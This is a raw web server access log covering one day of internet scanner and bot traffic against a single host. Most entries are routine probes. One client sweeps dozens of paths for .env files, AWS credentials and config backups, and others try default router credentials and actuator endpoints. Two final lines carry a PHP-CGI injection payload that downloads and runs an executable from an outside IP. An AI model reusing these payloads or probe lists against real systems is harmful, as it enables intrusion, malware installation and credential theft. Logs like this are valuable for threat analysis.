117.209.44.47 - - [07/Jan/2025:00:02:19 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 350 "-" "-"
139.59.101.104 - - [07/Jan/2025:15:54:18 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
57.129.64.10 - - [07/Jan/2025:16:06:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "\x16\x03\x01" 400 524 "-" "-"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "\x16\x03\x01" 400 524 "-" "-"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.213.229 - - [07/Jan/2025:16:27:51 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.213.229 - - [07/Jan/2025:16:27:52 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.213.229 - - [07/Jan/2025:16:27:52 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
91.223.3.201 - - [07/Jan/2025:16:41:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.172.14 - - [07/Jan/2025:16:53:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
193.34.212.75 - - [07/Jan/2025:16:59:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
220.167.232.59 - - [07/Jan/2025:17:36:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
27.98.228.104 - - [07/Jan/2025:17:36:16 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
171.8.138.185 - - [07/Jan/2025:17:36:17 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
43.248.108.70 - - [07/Jan/2025:17:36:17 +0000] "GET / HTTP/1.1" 200 1761 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
172.105.128.12 - - [07/Jan/2025:17:46:02 +0000] "\x16\x03\x01" 400 524 "-" "-"
79.160.51.240 - - [07/Jan/2025:17:46:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:18:13:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:18:13:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
118.33.142.122 - - [07/Jan/2025:18:29:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [07/Jan/2025:18:34:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [07/Jan/2025:18:44:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [07/Jan/2025:19:25:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:19:25:03 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [07/Jan/2025:19:55:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.34.212.75 - - [07/Jan/2025:20:27:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [07/Jan/2025:20:31:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [07/Jan/2025:20:34:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
104.40.90.165 - - [07/Jan/2025:20:37:12 +0000] "MGLNDD_34.155.227.229_80\n" 400 524 "-" "-"
92.255.57.58 - - [07/Jan/2025:20:44:31 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [07/Jan/2025:20:44:31 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [07/Jan/2025:20:47:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.184.132 - - [07/Jan/2025:20:52:40 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
193.41.206.36 - - [07/Jan/2025:20:54:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:18 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:19 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:20 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:20 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:21 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:21 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:22 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:22 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:23 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:23 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:24 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:24 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:25 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:25 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:26 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:26 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:27 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:27 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:28 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:28 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:29 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:29 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:30 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:30 +0000] "GET /docker/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:31 +0000] "GET /env.backup HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:31 +0000] "GET /xampp/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:32 +0000] "GET /lara/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:32 +0000] "GET /lara/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:33 +0000] "GET /laravel/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:33 +0000] "GET /.vscode/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:34 +0000] "GET /js/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:35 +0000] "GET /laravel/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:35 +0000] "GET /laravel/core/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:36 +0000] "GET /mail/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:37 +0000] "GET /mailer/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:37 +0000] "GET /nginx/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:38 +0000] "GET /public/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:39 +0000] "GET /site/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:39 +0000] "GET /xampp/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:40 +0000] "GET /main/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:40 +0000] "GET /node_modules/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:41 +0000] "GET /kyc/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:42 +0000] "GET /admin/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:42 +0000] "GET /prod/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:43 +0000] "GET /.env.bak HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:43 +0000] "GET /api/shared/config/config.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:44 +0000] "GET /api/shared/config.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:44 +0000] "GET /config.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:44 +0000] "GET /website/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:45 +0000] "GET /development/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:45 +0000] "GET /backend/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:45 +0000] "GET /api/shared/config/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:45 +0000] "GET /api/shared/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:46 +0000] "GET /api/config.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:46 +0000] "GET /service/email_service.py HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:46 +0000] "GET /node/.env_example HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:47 +0000] "GET /.env.production.local HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:47 +0000] "GET /.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:47 +0000] "GET /.env.example HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:48 +0000] "GET /.env.stage HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:48 +0000] "GET /server/config/database.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:48 +0000] "GET /.env.old HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:49 +0000] "GET /.env_sample HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:49 +0000] "GET /scripts/nodemailer.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:50 +0000] "GET /.env.prod HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:50 +0000] "GET /crm/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:51 +0000] "GET /local/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:51 +0000] "GET /core/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:51 +0000] "GET /apps/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:52 +0000] "GET /application/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:52 +0000] "GET /web/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:52 +0000] "GET /.aws/credentials HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:53 +0000] "GET /wp-config.php.bak HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:53 +0000] "GET /info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:54 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:54 +0000] "GET /static/js/main.141b0494.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:54 +0000] "GET /static/js/2.ca066a4b.chunk.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:55 +0000] "GET /static/js/main.e85f7a37.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:55 +0000] "GET /admin/server_info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:56 +0000] "GET /server_info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:56 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:57 +0000] "GET /test.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:57 +0000] "GET /server-info HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:57 +0000] "GET /server-info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:57 +0000] "GET /secured/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:58 +0000] "GET /config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:58 +0000] "GET /server.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:59 +0000] "GET /appsettings.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:59 +0000] "GET /shared/config/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:54:59 +0000] "GET /config/aws.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:00 +0000] "GET /settings.py HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:00 +0000] "GET /config.json HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:01 +0000] "GET /main.js HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:01 +0000] "GET /config/constants.js HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:01 +0000] "GET /application.properties HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:01 +0000] "GET /public/js/main.js HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:01 +0000] "GET /js/main.js HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:02 +0000] "GET /?phpinfo=1 HTTP/1.1" 200 1001 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:02 +0000] "GET /storage/logs/laravel.log HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [07/Jan/2025:20:55:02 +0000] "GET /karma.conf.json HTTP/1.1" 302 350 "-" "-"
80.82.68.110 - - [07/Jan/2025:21:08:29 +0000] "GET http://example.com/ HTTP/1.1" 200 947 "-" "Go-http-client/1.1"
80.82.68.110 - - [07/Jan/2025:21:08:29 +0000] "CONNECT example.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
153.168.29.252 - - [07/Jan/2025:21:09:37 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
34.77.219.241 - - [07/Jan/2025:21:16:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
92.255.57.58 - - [07/Jan/2025:21:18:43 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
78.153.140.149 - - [07/Jan/2025:21:21:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:21:21:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.225 - - [07/Jan/2025:21:29:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
91.223.3.201 - - [07/Jan/2025:21:42:54 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
89.248.168.227 - - [07/Jan/2025:22:22:26 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
89.248.168.227 - - [07/Jan/2025:22:22:26 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 zgrab/0.x"
89.248.168.227 - - [07/Jan/2025:22:22:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [07/Jan/2025:22:25:29 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:22:25:29 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.125.126 - - [07/Jan/2025:22:45:27 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
78.153.140.149 - - [07/Jan/2025:23:08:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:23:08:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
211.230.56.99 - - [07/Jan/2025:23:19:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
198.235.24.155 - - [07/Jan/2025:23:25:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
98.153.32.186 - - [07/Jan/2025:23:48:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
154.213.184.132 - - [07/Jan/2025:23:48:36 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
193.34.212.75 - - [07/Jan/2025:23:50:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.120.125.13 - - [07/Jan/2025:23:54:02 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
87.120.125.13 - - [07/Jan/2025:23:54:19 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>" "Go-http-client/1.1"
